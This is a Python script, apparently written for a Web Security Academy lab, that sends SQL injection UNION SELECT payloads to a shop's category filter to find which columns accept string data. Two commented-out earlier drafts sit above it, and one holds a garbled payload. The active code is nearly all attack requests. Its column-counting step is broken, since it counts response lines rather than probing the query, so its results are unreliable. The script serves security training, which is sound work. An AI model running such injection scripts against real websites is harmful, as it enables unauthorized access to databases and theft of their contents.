# # import requests

# # # Define the target URL
# # url = "https://0a160029037fdf73c33a4e3a00340044.web-security-academy.net/filter?category=Pets"

# # # Define the attack string
# # attack_string = "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"

# # # Define the headers for the HTTP request
# # headers = {
# #     "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
# #     "Referer": "https://0a160029037fdf73c33a4e3a00340044.web-security-academy.net/filter?category=Pets"
# # }

# # # Define the parameters for the HTTP request
# # params = {
# #     "category": attack_string
# # }

# # # Send the HTTP request with the attack string
# # response = requests.get(url, params=params, headers=headers)

# # # Print the response text
# # print(response.status_code)

# import requests

# # Define the target URL
# url = "https://0a160029037fdf73c33a4e3a00340044.web-security-academy.net/filter"

# # Define the attack string
# attack_string = "UNION SELECTLL,a',NULL,NULL,NULL--"

# # Define the headers for the HTTP request
# headers = {
#     "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
#     "Referer": url + "?category=Pets"
# }

# # Define the parameters for the HTTP request
# params = {
#     "category": attack_string
# }

# # Send the HTTP request with the attack string
# response = requests.get(url, params=params, headers=headers)

# # Print the response text
# print(response.status_code)

import requests

# Define the target URL
url = "https://0a160029037fdf73c33a4e3a00340044.web-security-academy.net/filter"

# Define the initial attack string to get the number of columns
attack_string = "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"

# Define the headers for the HTTP request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Referer": url + "?category=Pets"
}

# Define the parameters for the HTTP request
params = {
    "category": attack_string
}

# Send the HTTP request with the attack string to get the number of columns
response = requests.get(url, params=params, headers=headers)

# Parse the response text to get the number of columns
num_columns = len(response.text.split("\n"))

# Define the payloads for testing each column
payloads = []
for i in range(num_columns):
    payload = "1' UNION SELECT "
    for j in range(num_columns):
        if i == j:
            payload += "'a',"
        else:
            payload += "NULL,"
    payload = payload[:-1] + "--"
    payloads.append(payload)

# Test each column to determine if it can hold string data
string_columns = []
for payload in payloads:
    params["category"] = payload
    response = requests.get(url, params=params, headers=headers)
    if "Internal Server Error" not in response.text:
        string_columns.append(payload)

# Print the list of columns that can hold string data
print("Columns that can hold string data:")
for column in string_columns:
    print(column)

